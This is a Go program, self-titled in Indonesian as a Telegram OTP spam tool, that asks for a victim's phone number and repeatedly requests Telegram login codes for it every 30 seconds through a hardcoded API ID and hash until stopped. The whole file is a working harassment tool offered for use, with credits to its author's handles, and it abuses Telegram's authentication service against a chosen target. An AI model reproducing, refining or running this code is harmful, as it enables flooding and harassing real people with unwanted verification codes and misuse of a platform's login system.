package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/gotd/td/telegram"
	"github.com/gotd/td/telegram/auth"
	"github.com/gotd/td/tg"
)

const (
	API_ID   = 32337603
	API_HASH = "84da2c3fb2e974153cc5e72f1e9d1f53"
)

type sessionStorage struct{ data []byte }

func (s *sessionStorage) LoadSession(context.Context) ([]byte, error) { return s.data, nil }
func (s *sessionStorage) StoreSession(_ context.Context, d []byte) error {
	s.data = d
	return nil
}

type otpFlow struct{ phone string }

func (o *otpFlow) Phone(context.Context) (string, error)                 { return o.phone, nil }
func (o *otpFlow) Password(context.Context) (string, error)             { return "", nil }
func (o *otpFlow) AcceptTermsOfService(context.Context, tg.HelpTermsOfService) error { return nil }
func (o *otpFlow) Code(context.Context, *tg.AuthSentCode) (string, error) {
	return "", fmt.Errorf("otp_sent")
}
func (o *otpFlow) SignUp(context.Context) (auth.UserInfo, error) { return auth.UserInfo{}, nil }

var stopMe bool

func main() {
	fmt.Println("\n========================================")
	fmt.Println("     TOOLS SPAM OTP TELEGRAM AKTIF")
	fmt.Println("========================================")
	fmt.Println("📱 CREDIT: @zifermodss")
	fmt.Println("🎵 FOLLOW TIKTOK: @ziferrr")
	fmt.Println("========================================\n")

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("📱 Masukkan nomor target (contoh: +628123456789): ")
		phone, _ := reader.ReadString('\n')
		phone = strings.TrimSpace(phone)

		if phone == "exit" {
			fmt.Println("👋 Sampai jumpa!")
			break
		}

		if !strings.HasPrefix(phone, "+") {
			fmt.Println("❌ Gunakan format +62 ya bang!")
			continue
		}

		stopMe = false
		counter := 0

		fmt.Printf("\n🚀 SPAM OTP KE: %s\n", phone)
		fmt.Println("⏱️  Interval: 30 detik")
		fmt.Println("🛑 Ketik .stop untuk BERHENTI")
		fmt.Println("========================================\n")

		go func() {
			for {
				cmd, _ := reader.ReadString('\n')
				if strings.TrimSpace(cmd) == ".stop" {
					stopMe = true
					fmt.Println("\n🛑 Perintah stop diterima...")
				}
				time.Sleep(100 * time.Millisecond)
			}
		}()

		for !stopMe {
			counter++
			waktu := time.Now().Format("15:04:05")
			fmt.Printf("[%s] 📤 MENGIRIM OTP #%d ke %s...\n", waktu, counter, phone)

			err := kirimOTP(phone)

			if err != nil {
				fmt.Printf("[%s] ❌ GAGAL #%d: %v\n", waktu, counter, err)
			} else {
				fmt.Printf("[%s] ✅ BERHASIL! OTP #%d terkirim\n", waktu, counter)
			}

			for i := 0; i < 30 && !stopMe; i++ {
				time.Sleep(1 * time.Second)
			}
		}

		fmt.Printf("\n✅ BERHENTI! Total OTP terkirim: %d kali\n", counter)
		fmt.Println("========================================\n")
	}
}

func kirimOTP(phoneNumber string) error {
	ctx := context.Background()

	var storage sessionStorage

	client := telegram.NewClient(
		API_ID,
	 API_HASH,
		telegram.Options{
			SessionStorage: &storage,
		},
	)

	return client.Run(ctx, func(ctx context.Context) error {
		_, err := client.Auth().SendCode(ctx, phoneNumber, auth.SendCodeOptions{})
		return err
	})
}
